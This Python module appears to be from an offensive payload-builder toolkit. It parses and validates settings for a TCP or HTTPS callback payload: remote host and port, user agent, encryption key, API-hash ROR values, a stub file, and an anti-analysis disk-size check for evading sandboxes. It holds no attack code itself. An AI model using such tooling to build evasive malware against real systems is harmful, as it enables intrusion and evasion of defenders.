from scripts.utils import resolve_ip
import os
import re

ROR_VALUES_OK = [13,17,23]

def parse_config(config):

    CONFIG = {"payload":{},"stub":{},"anti_analysis":{}}

    # Payload
    CONFIG["payload"]["folder"] = config.get("Payload", "folder")
    if CONFIG["payload"]["folder"][-1] != "/":
        CONFIG["payload"]["folder"] += "/"
    CONFIG["payload"]["filename"] = config.get("Payload", "filename")

    if not os.path.isfile(CONFIG["payload"]["folder"]+CONFIG["payload"]["filename"]):
        print(f"Payload file {CONFIG["payload"]["folder"]+CONFIG["payload"]["filename"]} not found")
        exit(1)

    if "tcp" in CONFIG["payload"]["filename"]:
        CONFIG["payload"]["mode"] = "TCP"
    elif "https" in CONFIG["payload"]["filename"]:
        CONFIG["payload"]["mode"] = "HTTPS"
    else:
        CONFIG["payload"]["mode"] = None

    if CONFIG["payload"]["mode"] == "TCP":
        CONFIG["payload"]["rhost"] = config.get("Payload", "rhost")


        CONFIG["RPORT"] = config.getint("Payload", "rport")
        if CONFIG["RPORT"] > 65535 or CONFIG["RPORT"] < 0:
            print("Port number must be between 0 and 65535")
            exit(1)

    if CONFIG["payload"]["mode"] == "HTTPS":
        CONFIG["payload"]["user_agent"] = config.get("Payload", "user_agent")
        if not CONFIG["payload"]["user_agent"]:
            print("Payload User-Agent must be specified for HTTPS mode")
            exit(1)

    CONFIG["payload"]["encryption_key"] = int(config.get("Payload", "encryption_key"),16)
    if CONFIG["payload"]["encryption_key"] > 0xFFFF or CONFIG["payload"]["encryption_key"] < 0:
        print("Payload encryption key must be between 0 and 0xFFFF")
        exit(1)

    CONFIG["payload"]["ror_value"] = config.getint("Payload", "ror_value")
    if not CONFIG["payload"]["ror_value"] in ROR_VALUES_OK:
        print(f"ROR value for Payload hashes must be in {ROR_VALUES_OK}")
        exit(1)

    # Stub

    CONFIG["stub"]["filename"] = config.get("Stub", "filename")
    if not os.path.isfile("src/"+CONFIG["stub"]["filename"]):
        print(f"Stub file src/{CONFIG["stub"]["filename"]} not found")
        exit(1)

    # Anti analysis

    CONFIG["anti_analysis"]["disk_size"] = config.getint("Anti-Analysis", "disk_size")
    if not CONFIG["anti_analysis"]["disk_size"]:
        print("Anti-analysis maximal allowed disk size must be specified")
        exit(1)

    
    return CONFIG